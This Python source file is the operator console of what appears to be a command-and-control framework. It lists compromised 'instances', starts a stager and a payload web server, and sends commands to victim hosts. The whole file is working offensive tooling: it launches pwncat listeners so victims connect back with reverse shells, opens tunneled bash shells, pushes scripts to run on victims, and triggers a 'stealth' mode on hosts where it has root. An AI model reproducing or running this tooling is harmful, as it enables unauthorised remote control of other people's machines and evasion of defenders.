import my_logging
from typing import Callable, Optional
from prompt_toolkit import PromptSession
from prompt_toolkit.validation import DynamicValidator, Validator
from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
from prompt_toolkit.patch_stdout import patch_stdout
import os
import subprocess

import stager
from instance import Instance
from instance_manager import InstanceManager
import web_server
from pyterpreter import Message
from port_manager import PortManager

logger = my_logging.Logger('APP')


def get_lambda(func: Callable, *args):
    return lambda: func(*args)


class App():
    selected_instance: Optional[Instance] = None

    def __init__(self):
        InstanceManager.on_instances_update = self._on_instances_update
        with patch_stdout(raw=True):
            session = PromptSession()
            while True:
                command = session.prompt(
                    lambda: f'[{self.selected_instance if self.selected_instance in InstanceManager.get_all() else None}]> ',
                    completer=DynamicCompleter(lambda: NestedCompleter.from_nested_dict(self.completions)),
                    pre_run=session.default_buffer.start_completion,
                    validator=DynamicValidator(lambda: Validator.from_callable(lambda x: self.get_callable_from_command(x) is not None))
                )

                result = self.get_callable_from_command(command)()
                if isinstance(result, (list, tuple)):
                    logger.output('\n'.join(str(line) for line in result))
                elif result is not None:
                    logger.output(str(result))

    def get_callable_from_command(self, command: str) -> Optional[Callable]:
        try:
            args = []
            command_parts = command.split(' ')
            item = self.completions_with_functions
            for i in range(len(command_parts)):
                command_part = command_parts[i]
                try:
                    int(command_part)
                    item = item['INT']
                    args.append(int(command_part))
                except ValueError or KeyError:
                    item = item[command_part]
                if callable(item):
                    return get_lambda(item, *args)
        except KeyError:
            pass

    @property
    def completions_with_functions(self):
        instance_commands_if_root = {
            'stealth': self._do_stealth
        }
        instance_commands = {
            'pwncat': self._do_pwncat,
            'run_script': {
                script: get_lambda(self._do_run_script, script) for script in map(lambda path: os.path.split(path)[-1], web_server.get_available_scripts())
            },
            'shell': self._do_open_shell_bash
        }
        commands = {
            'show': {
                'instances': self._list_instances
            },
            'set': {
                'instance': {
                    uid: get_lambda(self._do_set_selected_instance, uid) for uid in InstanceManager.get_uids()
                }
            },

        }

        if self.selected_instance is not None:
            if self.selected_instance.is_root:
                commands = {**commands, **instance_commands_if_root}
            commands = {**commands, **instance_commands}
        return commands

    @property
    def completions(self):
        completions = {}

        def strip_functions(key_path):
            item = self.completions_with_functions
            for key in key_path:
                item = item[key]
            for key in item.keys():
                if callable(item[key]):
                    new_item = completions
                    for new_key in key_path:
                        if new_item.get(new_key, None) is None:
                            new_item[new_key] = {}
                        new_item = new_item[new_key]
                    new_item[key] = None
                else:
                    strip_functions([*key_path, key])

        strip_functions([])
        return completions

    def _do_set_selected_instance(self, uid: str):
        self.selected_instance = InstanceManager.get_by_uid(uid)

    def _do_run_script(self, script):
        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.RUN_SCRIPT, script)))

    def _do_open_shell_bash(self):
        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.OPEN_SHELL_TUNNELED)))

    def _do_pwncat(self):
        port = PortManager.get_open_port()
        subprocess.Popen(['tmux', 'new-window', '-n', f'pc:{self.selected_instance.username}', f'pwncat -lp {port}'], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.OPEN_SHELL_CLASSIC, str(port))))

    def _do_stealth(self):
        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.STEALTH)))

    def _on_instances_update(self):
        instances = InstanceManager.get_all()
        if self.selected_instance not in instances:
            self.selected_instance = None
        if self.selected_instance is None and len(instances) > 0:
            self.selected_instance = instances[0]
        self._list_instances()

    def _list_instances(self):
        for instance in InstanceManager.get_all():
            logger.output(f'{"==> " if instance == self.selected_instance else "    "}{instance}')


def main():
    web_server.start(should_wait=False)
    stager.initialise()
    InstanceManager.start_worker()
    App()


if __name__ == '__main__':
    main()
